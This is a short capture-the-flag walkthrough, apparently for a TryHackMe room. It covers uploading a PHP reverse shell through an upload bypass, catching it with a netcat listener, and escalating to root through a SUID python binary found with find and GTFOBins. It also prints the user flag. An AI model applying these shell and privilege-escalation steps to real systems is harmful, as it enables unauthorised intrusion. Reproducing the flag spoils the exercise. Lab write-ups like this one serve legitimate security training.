hint: search for file upload bypass and php reverse shell
What this means is that we can upload a web sheel and get a reverse shell.

After we find a php script we put our own IP address and port of our choice.
Upload the file.

Now we are gonna use netcat listener to lister for a connection in the selected port (8080)

nc -nlvp 8080

And now we run our php file by using curl

curl http://10.10.220.120/uploads/ourshell.php5

Now when we check back on our nc, we have a shell.

we can use the tool Find in order to make our job easier, the flag is user.txt so:

find / -type f -name user.txt 2> /dev/null
    -type f – you are telling find to look exclusively for files
    -name user.txt – instructing the find command to search for a file with the name “user.txt”
    2> /dev/null – so error messages do not show up as part of the search result 

We find user.txt in /usr/www/user.txt

cat user.txt: THM{y0u_g0t_a_sh3ll}

Now we have to find a way to escalate our priviledges to root, the way we do this is by
attempting to find files owned by root/are SUID. We will use find again:

find / -type f -user root -perm /4000
	here we use root user to search, not file name.

Here we find /usr/bin/python, which is unprotected, we will use gtfobins.github.io to study this
SUID file.

https://gtfobins.github.io/gtfobins/python/

We read the SUID section and use the provided commands, then use whoami to check you are root and
use find to find root.txt
